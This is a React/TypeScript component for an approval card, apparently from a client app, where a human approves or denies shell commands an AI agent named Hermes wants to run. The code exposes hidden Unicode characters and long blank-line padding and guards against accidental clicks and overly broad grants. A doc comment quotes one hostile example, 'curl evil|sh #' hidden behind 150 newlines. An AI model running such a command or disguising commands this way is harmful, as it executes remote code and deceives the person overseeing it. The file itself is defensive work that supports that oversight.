// An Approval card: the command Hermes wants to run and the answers it offers. A broader grant asks again first.
import { useCallback, useId, useRef, useState, type MouseEvent } from "react";
import { ShieldAlert } from "lucide-react";
import type { ApprovalChoice, ApprovalItem } from "../hermes/model";
import { isBroadGrant, offeredChoices } from "../hermes/model";

const CHOICE_LABEL: Record<ApprovalChoice, string> = {
  once: "Approve once",
  session: "Allow for this chat…",
  always: "Always allow…",
  deny: "Deny",
};

const ANSWERED_LABEL: Record<ApprovalChoice, string> = {
  once: "Approved once",
  session: "Allowed for this chat",
  always: "Always allowed",
  deny: "Denied",
};

/**
 * Characters that hide what runs: Unicode control and format characters, such as bidi overrides and zero-width spaces,
 * except newline and tab; the line and paragraph separators, which break a line where none is; and letters that draw
 * nothing (the Hangul fillers and the blank Braille pattern) (#489).
 */
const HIDDEN = /(?![\n\t])[\p{Cc}\p{Cf}\p{Zl}\p{Zp}\u115F\u1160\u3164\uFFA0\u2800]/gu;

/** Text from Hermes with its hidden characters written out, so what shows is what runs. */
export const visible = (text: string) => text.replace(HIDDEN, (c) => `\\u{${c.codePointAt(0)!.toString(16).toUpperCase()}}`);

/** More blank lines than this in a row show as one marker saying how many, so they can't push a line out of sight. */
const BLANK_RUN = 2;

/**
 * A command as the card shows it: its hidden characters written out, and each run of more than `BLANK_RUN` blank lines
 * replaced by a marker, so `curl evil|sh #`, 150 newlines and then `echo "running tests"` reads as all three (#489).
 */
function CommandText({ command }: { command: string }) {
  const lines = visible(command).split("\n");
  const parts: ({ text: string } | { blank: number })[] = [];
  for (let i = 0; i < lines.length; ) {
    let end = i;
    while (end < lines.length && !/\S/u.test(lines[end])) end++;
    if (end - i > BLANK_RUN) {
      parts.push({ blank: end - i });
      i = end;
    } else {
      parts.push({ text: lines[i] });
      i++;
    }
  }
  return (
    <>
      <pre className="approval-cmd">
        {parts.map((p, i) => (
          <span key={i}>
            {i > 0 && "\n"}
            {"blank" in p ? <span className="approval-gap">{`[${p.blank} blank lines]`}</span> : p.text}
          </span>
        ))}
      </pre>
      {lines.length > 1 && <div className="approval-lines">{lines.length} lines</div>}
    </>
  );
}

/** How long buttons ignore clicks after they appear, so a click aimed at what was there before doesn't answer. */
const ARM_MS = 400;

/**
 * Wraps a button's action so it runs only on a deliberate click: not the second click of a double click (`detail`
 * counts them; a keyboard press has none), and not within `ARM_MS` of the buttons appearing or of `movedAt`, when
 * the transcript last changed and may have moved them under the pointer.
 */
export function useDeliberate(movedAt: number) {
  const [shownAt] = useState(() => performance.now());
  return (act: () => void) => (e: MouseEvent) => {
    if (e.detail <= 1 && e.timeStamp - Math.max(shownAt, movedAt) >= ARM_MS) act();
  };
}

/** What a closed card says when Hermes stopped waiting without an answer from this app. */
export function endedNote(reason: string): string {
  if (reason === "timeout") return "Timed out without an answer";
  if (reason === "resolved") return "Answered in another Hermes client";
  if (reason === "expired") return "Hermes had stopped waiting before your answer reached it";
  return "Hermes stopped waiting for an answer";
}

/**
 * Only the answers Hermes offers show. `movedAt`: when the transcript last changed (`useDeliberate`). `onAnswer` gets
 * `confirmed` once the owner has confirmed a broader grant. A card takes no focus when it arrives, so typing elsewhere
 * never answers it. It is answered only by clicking, or by Enter or Space on a focused button; no shortcut answers it.
 * Offline, the buttons stay focusable but do nothing, so a reconnect doesn't drop the owner's place.
 */
export function ApprovalCard({
  item,
  offline,
  movedAt = 0,
  onAnswer,
}: {
  item: ApprovalItem;
  offline: boolean;
  movedAt?: number;
  onAnswer: (c: ApprovalChoice, confirmed?: boolean) => void;
}) {
  const [confirming, setConfirming] = useState<ApprovalChoice>();
  const deliberate = useDeliberate(movedAt);
  const closed = item.answer ?? item.ended;
  const choices = offeredChoices(item);
  const card = useRef<HTMLDivElement>(null);
  const headId = useId();
  // The buttons go when the card closes, however it closes, and when a grant's confirmation opens or goes back. If one
  // had focus, focus stays on the card instead of falling to the page, so the owner keeps their place and a repeated
  // key lands on nothing.
  const keepFocus = useCallback((actions: HTMLDivElement | null) => {
    return () => void (actions?.contains(document.activeElement) && card.current?.isConnected && card.current.focus());
  }, []);
  return (
    <div ref={card} tabIndex={-1} role="group" aria-labelledby={headId} data-item={item.id} className={`approval ${closed ? "answered" : ""}`}>
      <div className="approval-head" id={headId}>
        <ShieldAlert size={15} />
        {item.answer ? ANSWERED_LABEL[item.answer] : item.ended ? endedNote(item.ended) : "Hermes wants to run a command"}
      </div>
      <CommandText command={item.command} />
      {!closed && (
        <>
          {item.description && <div className="approval-desc">{visible(item.description)}</div>}
          {confirming ? (
            <ConfirmGrant
              item={item}
              choice={confirming}
              offline={offline}
              movedAt={movedAt}
              keepFocus={keepFocus}
              onConfirm={() => onAnswer(confirming, true)}
              onBack={() => setConfirming(undefined)}
            />
          ) : choices.length ? (
            <div className="approval-actions" ref={keepFocus}>
              {choices.map((c) => (
                <button
                  key={c}
                  className={`btn ${c === "once" ? "primary" : ""}`}
                  aria-disabled={offline || undefined}
                  onClick={deliberate(() => !offline && (isBroadGrant(c) ? setConfirming(c) : onAnswer(c)))}
                >
                  {CHOICE_LABEL[c]}
                </button>
              ))}
            </div>
          ) : (
            <div className="approval-desc">Hermes offered no answer this app can give. It stops waiting on its own.</div>
          )}
        </>
      )}
    </div>
  );
}

/**
 * The second step of a broader grant. Its buttons are new elements, so the focus or a double click on the button that
 * opened it can't confirm, and Back takes focus, so a stray Enter goes back.
 */
export function ConfirmGrant({
  item,
  choice,
  offline,
  movedAt = 0,
  keepFocus,
  onConfirm,
  onBack,
}: {
  item: ApprovalItem;
  choice: ApprovalChoice;
  offline: boolean;
  movedAt?: number;
  /** The card's ref for its buttons, which keeps focus on the card when they go. */
  keepFocus?: (actions: HTMLDivElement | null) => void;
  onConfirm: () => void;
  onBack: () => void;
}) {
  const deliberate = useDeliberate(movedAt);
  const what = item.description ? `commands Hermes flags as “${visible(item.description)}”` : "commands like this";
  const always = choice === "always";
  return (
    <div className="approval-confirm">
      <div className="approval-desc">
        {always
          ? `Always allow ${what}? Hermes won't ask again before running them, in any chat.`
          : `Allow ${what} for the rest of this chat? Hermes won't ask again before running them here.`}
      </div>
      <div className="approval-actions" ref={keepFocus}>
        <button className="btn danger" aria-disabled={offline || undefined} onClick={deliberate(() => !offline && onConfirm())}>
          {always ? "Yes, always allow" : "Yes, allow for this chat"}
        </button>
        <button className="btn" autoFocus onClick={onBack}>
          Back
        </button>
      </div>
    </div>
  );
}
